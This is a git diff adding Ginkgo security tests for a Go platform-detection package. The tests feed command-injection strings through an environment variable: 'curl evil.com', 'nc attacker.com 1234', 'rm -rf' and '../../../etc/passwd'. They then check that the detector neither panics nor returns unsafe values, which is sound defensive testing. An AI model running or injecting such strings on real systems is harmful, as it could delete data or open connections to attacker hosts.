@@ -1,7 +1,10 @@
 package platform_test
 
 import (
+	"fmt"
+	"os"
 	"runtime"
+	"strings"
 	"testing"
 
 	. "github.com/onsi/ginkgo/v2"
@@ -251,5 +254,128 @@ var _ = Describe("Platform String Representation", func() {
 		}
 
 		Expect(plat.String()).To(Equal("windows 10.0.19043 (amd64)"))
+	})
+})
+
+// Security tests for input validation (testing unexported functions through reflection or wrapper)
+var _ = Describe("Security - Input Validation", func() {
+	var detector *platform.Detector
+
+	BeforeEach(func() {
+		detector = platform.NewDetector()
+	})
+
+	Describe("Process name validation", func() {
+		// We'll need to create a wrapper to test the private function
+		// For now, we'll test it indirectly through the desktop environment detection
+		// which calls processExists internally
+
+		Context("when detecting desktop environment with malicious process names", func() {
+			It("should handle injection attempts safely", func() {
+				// This test verifies that the system doesn't crash or execute malicious commands
+				// when processing potentially malicious desktop environment variables
+
+				// Save original environment
+				originalXDG := os.Getenv("XDG_CURRENT_DESKTOP")
+				defer func() {
+					if originalXDG != "" {
+						os.Setenv("XDG_CURRENT_DESKTOP", originalXDG)
+					} else {
+						os.Unsetenv("XDG_CURRENT_DESKTOP")
+					}
+				}()
+
+				// Test various injection attempts
+				maliciousInputs := []string{
+					"gnome; rm -rf /tmp/test",
+					"kde && curl evil.com",
+					"xfce | nc attacker.com 1234",
+					"../../../etc/passwd",
+					"$(curl evil.com)",
+					"`rm -rf /tmp`",
+					"gnome\000hidden",
+					strings.Repeat("a", 100), // Very long string
+				}
+
+				for _, maliciousInput := range maliciousInputs {
+					os.Setenv("XDG_CURRENT_DESKTOP", maliciousInput)
+
+					// Detection should not crash and should either return a safe value or unknown
+					func() {
+						defer func() {
+							// Ensure no panic occurs
+							if r := recover(); r != nil {
+								Fail(fmt.Sprintf("Platform detection panicked with input %q: %v", maliciousInput, r))
+							}
+						}()
+
+						plat, err := detector.DetectPlatform()
+						Expect(err).ToNot(HaveOccurred())
+						Expect(plat).ToNot(BeNil())
+
+						// Desktop environment should either be empty, unknown, or a safe normalized value
+						if plat.DesktopEnv != "" && plat.DesktopEnv != "unknown" {
+							// Should be one of the known safe values
+							safeValues := []string{"gnome", "kde", "xfce", "mate", "cinnamon", "lxde", "unity"}
+							Expect(safeValues).To(ContainElement(plat.DesktopEnv))
+						}
+					}()
+				}
+			})
+		})
+	})
+
+	Describe("Command name validation", func() {
+		Context("when checking for package managers with malicious names", func() {
+			It("should safely handle command injection attempts", func() {
+				// This indirectly tests commandExists through detectPackageManagers
+				// which is called during platform detection
+
+				// The test verifies that malicious package manager names don't cause issues
+				func() {
+					defer func() {
+						if r := recover(); r != nil {
+							Fail(fmt.Sprintf("Package manager detection panicked: %v", r))
+						}
+					}()
+
+					plat, err := detector.DetectPlatform()
+					Expect(err).ToNot(HaveOccurred())
+					Expect(plat).ToNot(BeNil())
+
+					// Package managers list should only contain known safe values
+					knownPMs := []string{
+						"apt", "yum", "dnf", "pacman", "zypper", "emerge", "apk",
+						"snap", "flatpak", "appimage", "brew", "port", "fink", "nix",
+						"choco", "scoop", "winget",
+					}
+
+					for _, pm := range plat.PackageManagers {
+						Expect(knownPMs).To(ContainElement(pm),
+							fmt.Sprintf("Unknown package manager detected: %s", pm))
+					}
+				}()
+			})
+		})
+	})
+
+	Describe("Path traversal protection", func() {
+		It("should not be affected by directory traversal attempts", func() {
+			// Test that the detector doesn't try to access files outside expected paths
+			// This is mainly about the os.Open calls for distribution detection
+
+			func() {
+				defer func() {
+					if r := recover(); r != nil {
+						Fail(fmt.Sprintf("Platform detection panicked during file access: %v", r))
+					}
+				}()
+
+				// Detection should complete without trying to access dangerous paths
+				plat, err := detector.DetectPlatform()
+				Expect(err).ToNot(HaveOccurred())
+				Expect(plat).ToNot(BeNil())
+			}()
+		})
 	})
 })
